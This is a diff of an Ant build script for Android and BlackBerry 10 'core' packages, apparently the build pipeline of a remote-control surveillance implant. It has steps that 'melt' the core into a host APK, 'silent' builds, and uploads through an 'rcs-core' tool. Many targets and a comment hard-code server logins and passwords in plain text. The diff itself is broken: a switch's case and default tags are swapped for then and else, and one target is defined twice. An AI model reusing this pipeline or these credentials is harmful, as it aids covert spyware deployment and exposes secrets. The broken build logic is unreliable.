@@ -220,7 +220,9 @@
 
 			</switch>
 
-			<switch value="@{osversion}">
+            <var name="BB10" value="false" />
+            <switch value="@{osversion}">
+
 				<case value="v2" >
 
 					<!-- Alzare l'api level in caso di 3.x o 4.x -->
@@ -233,17 +235,8 @@
 						</filterset>
 					</copy>
                     <var name="gui" value="false" />
-				</case>
-                <case value="mapping">
-                    <copy file="preprocess/dexguard-project.mapping.txt" toFile="dexguard-project.txt" overwrite="true" />
-                    <copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="true">
-                        <filterset>
-                            <filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
-                            <filter token="DEBUGGABLE" value="${isdebug}" />
-                        </filterset>
-                    </copy>
-                </case>
-				<default>
+				</then>
+				<else>
 					<echo message="Copy Activity" />
 					<copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="true">
 						<filterset>
@@ -265,7 +258,7 @@
 					<filter token="BUILD_TIMESTAMP" value="${timestamp.BUILD}" />
 					<filter token="DEBUG" value="${isdebug}" />
 					<filter token="EXCEPTION" value="${isdebug}" />
-
+                    <filter token="BB10" value="${BB10}" />
 					<filter token="DEMO" value="${isdebug}" />
                     <filter token="GUI" value="${gui}" />
 					<!-- TODO RIMETTERE!!!! filter token="KEYS" value="${isdebug}" / -->
@@ -380,6 +373,13 @@
 		<delete dir="enc" />
 	</target>
 
+    <target name="set-debug-bb10" depends="init">
+        <set-cfg kind="debug" osversion="bb10">
+        </set-cfg>
+
+        <delete dir="enc" />
+    </target>
+
 	<target name="set-debug" depends="set-debug-default"/>
 
 	<target name="init_build" depends="clean">
@@ -430,8 +430,19 @@
         <antcall target="make_mapping" />
     </target>
 
+    <target name="build_bb10" depends="init_build">
+        <var name="osversion" value="bb10" />
+        <antcall target="build_var" />
+    </target>
+
+    <target name="build_bb10" depends="init_build">
+        <var name="osversion" value="bb10" />
+        <antcall target="build_var" />
+    </target>
+
 	<target name="build" depends="init">
-		<for list="default,v2" param="osversion">
+
+		<for list="default,v2,bb10" param="osversion">
 			<sequential>
 				<echo message="==============" />
 				<echo message="===  BUILD ===" />
@@ -509,7 +520,7 @@
 
 	<target name="build-debug" depends="init">
 
-		<for list="default,v2" param="osversion">
+		<for list="bb10" param="osversion">
 			<sequential>
 				<echo message="===========================" />
 				<echo message="===  BUILD releasedebug ===" />
@@ -604,13 +615,33 @@
 			</filterset>
 		</copy>
 
-        <copy file="output/release/core.android.default.apk" toDir="server/core" overwrite="true" />
-        <copy file="output/release/core.android.v2.apk" toDir="server/core" overwrite="true" />
-		<copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
-		<copy file="preprocess/AndroidManifest.BACKGROUND.xml" toFile="server/core/AndroidManifest.xml" overwrite="true" />
+
+        <copy file="output/release/core.android.v2.apk" toDir="server/core" overwrite="true"/>
+        <copy file="output/release/core.android.default.apk" toDir="server/core" overwrite="true"/>
+        <copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
 
 		<zip destfile="server/android_${version}.zip" basedir="server/core" />
 	</target>
+
+    <target name="servercore_bb10">
+        <delete dir="server/core_bb10" />
+        <mkdir dir="server/core_bb10" />
+
+        <copy toDir="server/core_bb10" overwrite="true">
+            <fileset dir="server/template_bb10" excludes="version" />
+        </copy>
+
+        <copy toDir="server/core_bb10" overwrite="true">
+            <fileset dir="server/template_bb10" includes="version" />
+            <filterset>
+                <filter token="VERSION" value="${version}" />
+            </filterset>
+        </copy>
+
+        <copy file="output/release/core.android.bb10.apk" toFile="server/core_bb10/core.bb10.apk" overwrite="true"/>
+        <zip destfile="server/bb10_${version}.zip" basedir="server/core_bb10" />
+        <echo>rcs-core -u batch -p Fabriziop123 -d rcs-local -n bb10 -f RCS_0000000001 -b server/template_bb10/b.json -o bb10.apk</echo>
+    </target>
 
 	<target name="dist" depends="init">
 		<echo>version = ${version}</echo>
@@ -623,6 +654,8 @@
 		<antcall target="servercore" />
 		<copy file="server/android_${version}.zip" toDir="${destdir}" overwrite="true" />
 
+        <antcall target="servercore_bb10" />
+
 		<zip destfile="${destdir}/android_sources.zip" basedir="." excludes="**/build/intermediates/**, **/build/generated/**, **/classes/**, **/server/historic/**, **/melting/tmp/**, **/melting/host.apk, **/antlibs/historic/**, **/sqlite/**" />
 
 		<checksum>
@@ -632,8 +665,68 @@
 		</checksum>
 	</target>
 
+    <macrodef name="updaterelease">
+        <attribute name="server" />
+        <attribute name="login" />
+        <attribute name="password" />
+        <attribute name="file" />
+        <attribute name="core" />
+        <sequential>
+            <echo>@{server} : ${rcscore.path}/rcs-core.rb</echo>
+
+            <exec executable="${ruby.path}" dir="." failonerror="true">
+                <arg value="${rcscore.path}/rcs-core.rb" />
+                <arg value="-u" />
+                <arg value="@{login}" />
+                <arg value="-p" />
+                <arg value="@{password}" />
+                <arg value="-d" />
+                <arg value="@{server}" />
+                <arg value="-n" />
+                <arg value="@{core}" />
+                <arg value="-R" />
+                <arg value="@{file}" />
+            </exec>
+        </sequential>
+    </macrodef>
+
+    <macrodef name="buildsilent">
+        <!-- rcs-core -u batch -p Fabriziop123 -d rcs-local -n bb10 -f RCS_0000000001 -b server/template_bb10/b.json -o bb10.apk -->
+        <attribute name="server" />
+        <attribute name="login" />
+        <attribute name="password" />
+        <attribute name="core" />
+        <attribute name="json" />
+        <attribute name="factory" />
+        <sequential>
+            <echo>@{server} : ${rcscore.path}/rcs-core.rb</echo>
+
+            <exec executable="${ruby.path}" dir="." failonerror="true">
+                <arg value="${rcscore.path}/rcs-core.rb" />
+                <arg value="-u" />
+                <arg value="@{login}" />
+                <arg value="-p" />
+                <arg value="@{password}" />
+                <arg value="-d" />
+                <arg value="@{server}" />
+                <arg value="-n" />
+                <arg value="@{core}" />
+                <arg value="-f" />
+                <arg value="@{factory}" />
+                <arg value="-b" />
+                <arg value="@{json}" />
+                <arg value="-o" />
+                <arg value="output/@{core}_@{server}.zip" />
+            </exec>
+        </sequential>
+    </macrodef>
+
+    <target name="silent-bb10">
+        <buildsilent server="rcs-local" login="batch" password="Fabriziop123" core="bb10" json="antlibs/bb10_silent.json" factory="RCS_0000000001"  />
+    </target>
+
 	<target name="update">
-		<updaterelease server="rcs-castore" login="zenobatch" password="castoreP123" file="server/android_${version}.zip" />
+		<updaterelease server="rcs-castore" login="zenobatch" password="castoreP123" file="server/android_${version}.zip" core="android"/>
 		<copy file="./server/android_${version}.zip" toFile="/Volumes/SHARE/RELEASE/SVILUPPO/cores galileo/android.zip" overwrite="true" />
 	</target>
 
@@ -655,31 +748,32 @@
         <antcall target="set-debug" />
 	</target>
 
-    <target name="test-local" depends="build">
-        <antcall target="servercore" />
-        <antcall target="update-local" />
+    <target name="test-local" depends="build-debug">
+        <antcall target="servercore_bb10" />
+        <antcall target="update-bb10" />
         <antcall target="set-debug" />
     </target>
 
 	<target name="update-castore">
-		<updaterelease server="rcs-castore" login="zenobatch" password="castoreP123" file="server/android_${version}.zip" />
+		<updaterelease server="rcs-castore" login="zenobatch" password="castoreP123" file="server/android_${version}.zip" core="android" />
 	</target>
 
 	<target name="update-polluce">
-		<updaterelease server="rcs-polluce" login="zeno" password="Pollucep123" file="server/android_${version}.zip" />
+		<updaterelease server="rcs-polluce" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" core="android"/>
 	</target>
 
-    <target name="update-local">
-        <updaterelease server="rcs-local" login="admin" password="testriteP123" file="server/android_${version}.zip" />
+    <target name="update-bb10">
+        <updaterelease server="rcs-local" login="batch" password="Fabriziop123" file="server/bb10_${version}.zip" core="bb10"/>
+        <antcall target="silent-bb10"/>
     </target>
 
 	<target name="update-zeus">
-		<updaterelease server="192.168.100.190" login="admin" password="testriteP123" file="server/android_${version}.zip" />
-		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
+		<updaterelease server="192.168.100.190" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" core="android"/>
+		<!-- <copy file=".\server\bb10_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
 	</target>
 
 	<target name="update-minotauro">
-		<updaterelease server="rcs-minotauro" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" />
+		<updaterelease server="rcs-minotauro" login="zeno" password="zenop123" file="server/android_${version}.zip" core="android"/>
 	</target>
 
 	<target name="ci">
